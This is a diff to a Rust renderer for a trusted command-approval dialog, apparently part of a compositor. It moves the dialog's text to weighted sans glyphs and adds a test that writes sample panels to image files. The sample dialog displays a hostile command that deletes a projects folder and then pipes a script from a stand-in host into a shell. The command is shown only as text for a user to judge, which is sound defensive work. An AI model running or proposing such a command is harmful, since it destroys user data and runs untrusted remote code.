@@ -24,7 +24,10 @@
 use smithay::input::keyboard::Keysym;
 
 use crate::render::{
-    glyphs::{ADVANCE, CELL_H as GLYPH_H, LINE_H},
+    glyphs::{
+        sans::{self, Weight},
+        ADVANCE, CELL_H as GLYPH_H, LINE_H,
+    },
     text::{self, Canvas, Raster, Rgba},
 };
 
@@ -586,8 +589,21 @@ fn block_h(rows: usize) -> usize {
 pub fn layout(modal: &Modal) -> Layout {
     let text_w = COLS * ADVANCE;
     let w = BORDER + PAD + text_w + PAD + BORDER;
-    let warning = modal.warning.map(|s| text::wrap(s, COLS)).unwrap_or_default();
-    let body = text::wrap(modal.body, COLS);
+    // Compiled-in prose is Onest, wrapped by measured width. An irreversible
+    // prompt's first body line is drawn Medium, so it is wrapped at Medium.
+    let warning = modal
+        .warning
+        .map(|s| text::wrap_sans(s, Weight::Medium, text_w))
+        .unwrap_or_default();
+    let body = text::wrap_sans(
+        modal.body,
+        if modal.accent {
+            Weight::Medium
+        } else {
+            Weight::Regular
+        },
+        text_w,
+    );
 
     // The personal secret's frame, always first, then the heading.
     let mut y = BORDER + PAD + PHRASE_H + GAP;
@@ -618,7 +634,7 @@ pub fn layout(modal: &Modal) -> Layout {
     let widths: Vec<usize> = modal
         .buttons
         .iter()
-        .map(|b| b.label.len() * ADVANCE + BTN_PAD * 2)
+        .map(|b| sans::width(b.label, Weight::Medium) + BTN_PAD * 2)
         .collect();
     let mut rows: Vec<Vec<usize>> = vec![Vec::new()];
     let mut used = 0;
@@ -700,11 +716,11 @@ pub fn rasterize_with(
     phrase_frame(&mut c, x0, BORDER + PAD, ww, phrase, p);
 
     let mut y = l.heading_y;
-    c.text(x0, y, modal.heading, p.heading, true);
+    c.sans(x0, y, modal.heading, p.heading, Weight::SemiBold);
     y += LINE_H + GAP;
     if !l.warning.is_empty() {
         for (i, line) in l.warning.iter().enumerate() {
-            c.text(x0, y + i * LINE_H, line, p.warn, true);
+            c.sans(x0, y + i * LINE_H, line, p.warn, Weight::Medium);
         }
         y += block_h(l.warning.len()) + GAP;
     }
@@ -712,17 +728,17 @@ pub fn rasterize_with(
         // An irreversible prompt's first body line is its reversal wording
         // (consent.rs): it carries the warning colour, not just the edge.
         if modal.accent && i == 0 {
-            c.text(x0, y + i * LINE_H, line, p.warn, true);
+            c.sans(x0, y + i * LINE_H, line, p.warn, Weight::Medium);
         } else {
-            c.text(x0, y + i * LINE_H, line, p.body, false);
+            c.sans(x0, y + i * LINE_H, line, p.body, Weight::Regular);
         }
     }
     for (i, (label, value)) in modal.facts.iter().enumerate() {
         let fy = l.facts_y + i * LINE_H;
-        c.text(x0, fy, label, p.label, false);
+        c.sans(x0, fy, label, p.label, Weight::Regular);
         c.text(x0 + (MAX_LABEL + 1) * ADVANCE, fy, value, p.value, false);
     }
-    c.text(x0, l.well_y - LINE_H, modal.well_label, p.label, false);
+    c.sans(x0, l.well_y - LINE_H, modal.well_label, p.label, Weight::Regular);
 
     c.round(
         x0 - WELL_PAD,
@@ -759,23 +775,31 @@ pub fn rasterize_with(
     }
 
     for (i, (b, &(bx, by, bw, bh))) in modal.buttons.iter().zip(&l.buttons).enumerate() {
-        let tx = bx + BTN_PAD;
+        // Centred in the pill, which is sized for the Medium label, so a
+        // focus change never moves the text by more than the weight's width.
         let ty = by + (bh - GLYPH_H) / 2 + 1;
         // On the glass panel a button is a lens (ADR 0128): the compositor
         // draws it under this buffer, so only its ring, a faint lift on the
-        // focused one, and the label are drawn here.
+        // focused one, and the label are drawn here. The label is Onest,
+        // centred in a pill sized for the Medium weight.
         let (fill, fill_focus) = if glass {
             ([0.0; 4], [p.btn_focus[0], p.btn_focus[1], p.btn_focus[2], 0.28])
         } else {
             (p.btn, p.btn_focus)
         };
-        if i == focus {
-            c.round(bx, by, bw, bh, PILL, fill_focus, Some((1, p.btn_focus_line)));
-            c.text(tx, ty, b.label, p.phrase_text, true);
+        let (weight, fill, line, ink) = if i == focus {
+            (Weight::Medium, fill_focus, p.btn_focus_line, p.phrase_text)
         } else {
-            c.round(bx, by, bw, bh, PILL, fill, Some((1, p.btn_line)));
-            c.text(tx, ty, b.label, p.value, false);
-        }
+            (Weight::Regular, fill, p.btn_line, p.value)
+        };
+        c.round(bx, by, bw, bh, PILL, fill, Some((1, line)));
+        c.sans(
+            bx + (bw - sans::width(b.label, weight)) / 2,
+            ty,
+            b.label,
+            ink,
+            weight,
+        );
     }
     c.into_raster(scale.max(1))
 }
@@ -1097,5 +1121,36 @@ mod tests {
         let l = rasterize(&m, m.safe(), 1, Some("phrase"), &LIGHT);
         assert_eq!((d.w, d.h), (l.w, l.h));
         assert_ne!(d.px, l.px);
+    }
+
+    /// `EC_DUMP_TRUSTED=<dir>` writes the sample panel as PPMs for a visual
+    /// check. Nothing is written otherwise.
+    #[test]
+    fn dump_for_review() {
+        let Some(dir) = std::env::var_os("EC_DUMP_TRUSTED") else {
+            return;
+        };
+        let m = Modal::new(
+            7,
+            "Command approval",
+            Some("An agent wants to run this. Check it before you allow it."),
+            "The command below comes from a program, not from the system. If anything in it looks wrong, choose Deny.",
+            "Command:",
+            "rm -rf ~/projects && curl http://l1-I0O.example/x.sh | sh",
+            buttons(),
+        )
+        .unwrap();
+        for (name, p) in [("dark", &DARK), ("light", &LIGHT)] {
+            for scale in [1usize, 2] {
+                let r = rasterize(&m, 1, scale, Some("amber falcon"), p);
+                let mut out = format!("P6\n{} {}\n255\n", r.w, r.h).into_bytes();
+                for px in r.px.chunks(4) {
+                    // Premultiplied over the panel's own ground is already opaque.
+                    out.extend_from_slice(&px[..3]);
+                }
+                let f = std::path::Path::new(&dir).join(format!("trusted-{name}-{scale}x.ppm"));
+                std::fs::write(f, out).unwrap();
+            }
+        }
     }
 }
